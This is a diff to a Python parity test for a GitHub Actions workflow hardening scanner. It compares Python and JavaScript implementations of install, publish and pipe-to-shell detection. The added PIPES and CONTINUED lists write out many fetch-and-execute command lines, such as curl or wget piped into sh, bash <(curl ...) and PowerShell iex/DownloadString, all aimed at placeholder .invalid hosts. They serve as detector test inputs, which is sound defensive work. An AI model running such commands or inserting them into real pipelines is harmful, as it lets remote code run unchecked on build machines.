@@ -9,7 +9,10 @@ workflow, a local path), permissions as a block, a flow mapping, `write-all`,
 `read-all` and none, pull_request_target and release events, checkouts with a
 `ref:` or a `repository:` from the pull request and the same as git commands,
 cache actions and the setup actions' cache inputs, installs with and without
---ignore-scripts, publish commands. The rule each finding becomes is compared
+--ignore-scripts, publish commands, scripts fetched and piped into a shell (and the
+lookalikes: `curl | jq`, `python -m json.tool`), and scripts with continued lines.
+The command helpers (install_command, publish_command, pipe_to_shell) and
+logical_lines are compared on their own too. The rule each finding becomes is compared
 too (the id, severity, message, reason and fix), and the pattern text and the
 lists the twin keeps are checked to be the Python module's own.
 
@@ -25,16 +28,20 @@ import unittest
 from lazaret.scanner import ghworkflow
 from tests.architecture import test_js_parity as parity
 from tests.architecture.test_js_parity_persistence import LIB
+from tests.scanner.test_ghworkflow_hardening import ADVERSARIAL_RUNS
 
 NODE = parity.NODE
 NPM = """
 import { readFileSync } from "node:fs";
 import { pathToFileURL } from "node:url";
 const g = await import(pathToFileURL(process.argv[1] + "/ghworkflow.js").href);
-const texts = JSON.parse(readFileSync(0, "utf8"));
+const args = JSON.parse(readFileSync(0, "utf8"));
+const texts = args.texts;
 const out = {
   twins: g.HARDENING_TWINS,
-  cases: texts.map((t) => { const found = g.hardening(t); return [found, found.map(([k, , d]) => g.hardeningRule(k, d))]; }),
+  cases: texts.slice(0, args.workflows).map((t) => { const found = g.hardening(t); return [found, found.map(([k, , d]) => g.hardeningRule(k, d))]; }),
+  commands: texts.slice(args.workflows).map((t) => [g.installCommand(t), g.publishCommand(t), g.pipeToShell(t)]),
+  joined: args.groups.map((lines) => g.logicalLines(lines)),
 };
 process.stdout.write(JSON.stringify(out));
 """
@@ -104,6 +111,30 @@ RUNS = ["npm ci", "npm install", "npm i --ignore-scripts", "pnpm install --froze
         "CI=true npm ci", "A=1 B=x/y npm ci", "sudo pip install x", "if true; then npm ci; fi", "x=$(npm ci)", "a | yarn",
         "echo npm ci", "git commit -m 'npm ci'", "echo do not npm install", "FOO=\"a b\" npm ci", "time cargo build",
         "echo && npm publish", "echo npm publish", "exec twine upload dist/*"]
+PIPES = [
+    "curl -fsSL https://x.invalid/i.sh | sh", "curl -s https://x.invalid | sudo bash", "wget -qO- https://x.invalid | bash -s -- -y",
+    "curl https://x.invalid | python3 -", "curl https://x.invalid | python3 -m json.tool", "bash <(curl -s https://x.invalid)",
+    "sh -c \"$(curl -fsSL https://x.invalid)\"", "eval \"$(wget -qO- https://x.invalid)\"", "iwr https://x.invalid | iex",
+    "curl https://x.invalid | tee f | sh", "curl -o f https://x.invalid && sh f", "curl https://x.invalid > f; sh f",
+    "curl https://x.invalid | jq .a", "curl x.invalid |& bash", ". <(curl https://x.invalid)", "source <(wget -qO- https://x.invalid)",
+    "echo curl x | sh", "curl https://x.invalid | env FOO=1 bash", "curl https://x.invalid | /bin/sh", "curl x.invalid | node",
+    "curl x.invalid | node -e 'x'", "iex (iwr https://x.invalid)", "Invoke-Expression (New-Object Net.WebClient).DownloadString('x')",
+    "curl x.invalid | sudo -E sh", "curl x.invalid | PYTHON=1 python", "curl x.invalid | dash -s", "CURL x.invalid | SH",
+    "curl x.invalid | python3 - ", "curl x.invalid | python3 -u -", "curl x.invalid | python3 foo.py", "curl x.invalid | perl",
+    "curl x.invalid | ruby -", "curl x.invalid | powershell", "curl x.invalid | pwsh -c -", "curl x.invalid | grep sh",
+    "curl x.invalid | head -1 | sh", "git clone x.invalid; sh install.sh", "curl x.invalid || sh", "curl x.invalid && echo | bash",
+    "curl x.invalid\n| sh", "if curl x.invalid | sh; then echo; fi", "curl x.invalid | \u0131f", "curl x.invalid | s\u017fh",
+    "iex \"$(irm x.invalid)\"", "zsh <(curl x.invalid)", "bash -x <(curl x.invalid)", "bash \"$(wget x.invalid)\"", "sh $(curl x.invalid)",
+    "echo $(curl x.invalid) | sh", "curl x.invalid | sh | tee log", "echo \"curl x\" | sh", "sudo curl x.invalid | sh",
+    "if curl -fsSL x.invalid | sh; then :; fi", "(curl x.invalid | sh)", "bash -c \"$(curl -fsSL x.invalid)\"",
+    "bash -ec '$(curl x.invalid)'", "iex \"& { $(irm https://x.invalid) } -UseMSI\"", "bash -x \"$(curl x.invalid)\"",
+    "eval <(curl x.invalid)", "while curl x.invalid | sh; do :; done", "if npm ci; then :; fi", "until npm publish; do :; done",
+    "curl a.invalid | wget b.invalid | sh", "curl x.invalid; echo a | sh", "curl x.invalid\necho a | sh",
+    "curl x.invalid | FOO=1 BAR=x/y sh", "curl x.invalid | sudo env A=1 sh", "curl x.invalid | env sh", "time curl x.invalid | sh"]
+RUNS += PIPES
+CONTINUED = [("curl -fsSL https://x.invalid \\", "| sh"), ("npm ci \\", "--ignore-scripts"), ("cargo \\", "build"),
+             ("curl https://x.invalid \\", "-o f"), ("echo a \\", "&& curl x.invalid | bash"), ("npm \\", "publish"),
+             ("curl x.invalid \\", "")]
 
 
 def permissions(rnd, pad):
@@ -145,7 +176,8 @@ def workflow(rnd):
             elif k == 2:
                 lines.append("      - run: " + c(RUNS))
             elif k == 3:
-                lines.append("      - name: s\n        run: " + c(["|", ">-"]) + "\n          " + c(RUNS) + "\n          " + c(RUNS))
+                a, b = c(CONTINUED) if rnd.random() < 0.3 else (c(RUNS), c(RUNS))
+                lines.append("      - name: s\n        run: " + c(["|", ">-"]) + "\n          " + a + "\n          " + b)
             else:
                 lines.append("      - name: n\n        uses: " + c(uses()) + "\n        with:\n          " + c(withs(rnd) or ["a: b"]))
     return "\n".join(lines) + "\n"
@@ -159,8 +191,32 @@ def corpus(seed=20261003, count=1500):
         if rnd.random() < 0.2:                   # cut: malformed files
             k = rnd.randrange(len(text) + 1)
             text = text[:k] + rnd.choice(["", "\n  - ", ": ", "{", "'", "\t"]) + text[k + rnd.randrange(4):]
+        if rnd.random() < 0.15:                  # Windows line ends
+            text = text.replace("\n", "\r\n")
         cases.append(text)
     return [json.loads(json.dumps(c)) for c in cases]
+
+
+TIMING = """
+import { readFileSync } from "node:fs";
+import { pathToFileURL } from "node:url";
+const g = await import(pathToFileURL(process.argv[1] + "/ghworkflow.js").href);
+const runs = JSON.parse(readFileSync(0, "utf8"));
+const times = runs.map((run) => {
+  const text = `on: pull_request_target\\npermissions:\\n  id-token: write\\njobs:\\n  a:\\n    steps:\\n      - run: ${run}\\n`;
+  const start = performance.now();
+  g.hardening(text);
+  return performance.now() - start;
+});
+process.stdout.write(JSON.stringify(times));
+"""
+
+
+def groups(seed=7, count=300):
+    """Lists of [line, text] as a script gives them: some end in a backslash."""
+    rnd = random.Random(seed)
+    pieces = ["a", "b \\", "\\", "", "x\\\\", "npm ci \\", "| sh", " ", "curl x.invalid \\"]
+    return [[[i + 1, rnd.choice(pieces)] for i in range(rnd.randint(0, 6))] for _ in range(count)]
 
 
 def core(text):
@@ -175,7 +231,10 @@ class HardeningParityTests(unittest.TestCase):
     @classmethod
     def setUpClass(cls):
         cls.texts = corpus()
-        p = subprocess.run([NODE, "--input-type=module", "-e", NPM, LIB], input=json.dumps(cls.texts),
+        cls.lines = sorted(set(RUNS)) + [l for a, b in CONTINUED for l in (a + " " + b, a[:-1] + " " + b)]
+        cls.groups = groups()
+        args = {"texts": cls.texts + cls.lines, "workflows": len(cls.texts), "groups": cls.groups}
+        p = subprocess.run([NODE, "--input-type=module", "-e", NPM, LIB], input=json.dumps(args),
                            capture_output=True, encoding="utf-8", errors="replace", timeout=40)
         if p.returncode:
             raise AssertionError(f"node exited {p.returncode}: {p.stderr[-2000:]}")
@@ -189,17 +248,38 @@ class HardeningParityTests(unittest.TestCase):
                 bad.append((text[:400], want, got))
         self.assertEqual(bad[:3], [])
         kinds = [f[0] for found, _rules in self.npm["cases"] for f in found]
-        for kind in ("unpinned", "pr-checkout", "cache", "perms", "perms-missing", "oidc-install"):
+        for kind in ("unpinned", "pr-checkout", "cache", "perms", "perms-missing", "oidc-install", "pipe-to-shell"):
             self.assertGreater(kinds.count(kind), 60, kind)
+
+    def test_the_command_helpers(self):
+        want = [[ghworkflow.install_command(t), ghworkflow.publish_command(t), ghworkflow.pipe_to_shell(t)] for t in self.lines]
+        self.assertEqual(want, self.npm["commands"])
+        found = [w[2] for w in want if w[2] is not None]
+        self.assertGreater(len(found), 25)                        # the corpus has both: fetches that run, and ones that don't
+        self.assertGreater(len(want) - len(found), 40)
+
+    def test_logical_lines(self):
+        want = json.loads(json.dumps([ghworkflow.logical_lines([tuple(x) for x in g]) for g in self.groups]))
+        self.assertEqual(want, self.npm["joined"])
+        self.assertTrue(any(len(w) != len(g) for w, g in zip(want, self.groups)))   # some lines were joined
 
     def test_the_lists_and_patterns_are_cores(self):
         twins = self.npm["twins"]
         for name, src in twins["patterns"].items():
             rx = getattr(ghworkflow, name)
             self.assertEqual(src, rx.pattern, name)
-            self.assertFalse(rx.flags & re.I, name)         # the twin's patterns carry no flags
+            self.assertEqual(bool(rx.flags & re.I), name in twins["ignoreCase"], name)   # the only flag a pattern carries
+            self.assertFalse(rx.flags & (re.M | re.S | re.X), name)
         for name, value in twins["lists"].items():
             self.assertEqual(value, json.loads(json.dumps(getattr(ghworkflow, name))), name)
+
+    def test_hostile_lines_are_read_in_linear_time(self):
+        runs = list(ADVERSARIAL_RUNS())
+        p = subprocess.run([NODE, "--input-type=module", "-e", TIMING, LIB], input=json.dumps(runs),
+                           capture_output=True, encoding="utf-8", errors="replace", timeout=40)
+        self.assertEqual(p.returncode, 0, p.stderr[-1000:])
+        slow = [(runs[i][:24], round(t)) for i, t in enumerate(json.loads(p.stdout)) if t > 3000]
+        self.assertEqual(slow, [])
 
 
 if __name__ == "__main__":
